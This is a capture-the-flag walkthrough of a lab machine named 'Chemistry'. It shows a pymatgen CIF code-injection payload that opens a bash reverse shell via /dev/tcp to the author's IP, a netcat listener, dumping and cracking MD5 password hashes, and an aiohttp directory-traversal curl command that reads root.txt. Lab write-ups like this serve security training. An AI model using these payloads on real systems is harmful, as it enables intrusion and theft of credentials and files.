# Chemistry (Linux)

Target IP Address 10.10.11.38

ran `nmap -sVC 10.10.11.38`

## Results (from nmap)
Two open port numbers:
1. 22 (SSH)
2. 5000 (HTTP)

## 5000 (HTTP)
From the very beginning we see a web page that displays
> Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.
with Login and Register buttons, both have a directory/path that it takes you to. 

Tried to use username, password to login and no luck. 

Inspected the webpage and looked at the source code for anything useful.
Went over to storage and foudn that under cookies that have left a session key, xss attack?

Before that, I wanted to try and see what the register button does; put in a username and a password and it register you right away. 
We can instantly see that it allows us to upload a CIF file. 

## CIF exploit
Once I saw that we can upload a file that alwaus just means that is a perfect opporunity to try and exploit it.
Googled "CIF file exploit" and came acroos this [GitHub](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f)

**Let's rememeber the fact that the webpage when we register also gave an CIF example file to download (An example is available here) with a link that downloads the file**

From the code that we found in this github link; we can use this to insert it into our CIF example file. 
1. The .cif file is supposed to store crystallographic data for molecular structures.
2. Instead of purely scientific data, it injects Python code through the os.system() function.
3. `"__builtins__.__import__('os').system('/bin/bash -c \"sh -i >& /dev/tcp/youripaddress/portlisternernumber 0>&1\"')"` 

THE FINAL .cif WILL LOOK LIKE THIS

`data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1

 _space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/10.10.14.202/7777 0>&1\'");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "

`

Once all this is done we can go ahead an upload our .cif file.
Start a Netcat listener (make sure the port number is all the same) `nc -lvnp 7777`.
Click on view and this will trigger the reverse shell, establashing a connection back to our ip address. 

From here you want to look/search for anything useful. 
`ls -la` lists all files and directories (including hidden ones) in long format, showing detailed permissions, ownership, size, and modification time.

Notice a directory "instance"; `cd` into it and then we do the same as we did just now. `ls -la` and look for anything useful.
We come across database.db
Use `sqlite3 database.db`
`.tables` built-in SQLite command
`SELECT * FROM user;`
List of user names and MD5 hashed passwords will display.
[Crack MD5 hash passwords] (https://crackstation.net/)

I tried admin and the one after and did not work until I got to rosa and cracked the password.

## SSH
`ssh rosa@10.10.10.28`
Login with the password we just cracked.
Look for the user.txt flag

Once you found that we want to get more information from this machine and see what we find.
`cd ..` We see an app directory 
Able to notice that it is running a python application. 
Was not able to use `cat` on the .py file and could not get into the other directories.
We know it is running a python app so most likely in the development stages.
`curl localhost:8080 --head` Here we can see that it is running **aiohttp/3.9.1**; begin searching for known exploits related to this version.
Using the curl command we got from [here] (https://ethicalhacking.uk/cve-2024-23334-aiohttps-directory-traversal-vulnerability/#gsc.tab=0), we will be able to run the exploit. 
Since all we are looking for is root.txt we add that into the command `curl -s --path-as-is "http://localhost:8081/static/../../../../../root/root.txt"`
404 is what is returned when running this command. /static does not exist so we for sure have to look for a path that does. 
If we `curl -s localhost:8080` and take a look at the code; we find that there is a directory/path called **assets**. Add it into the curl command and root.txt will display right under.


Simple solid CTF to start again after a long break; with great power comes great responsibility, stay ethical.

The target machine (10.10.11.38) has two open ports: SSH (22) and HTTP (5000). The web page allows users to upload CIF files. Exploiting this, a malicious Python code was injected into a CIF file to create a reverse shell. After uploading the file, a netcat listener on port 7777 established a connection, allowing access to the machine.

In the "instance" directory, an SQLite database was found, revealing user data with MD5 hashed passwords. After cracking the password for "rosa," SSH was accessed, and further exploration led to the discovery of a Python application running on port 8080. A known exploit in the aiohttp version (3.9.1) was used to retrieve the root.txt flag.


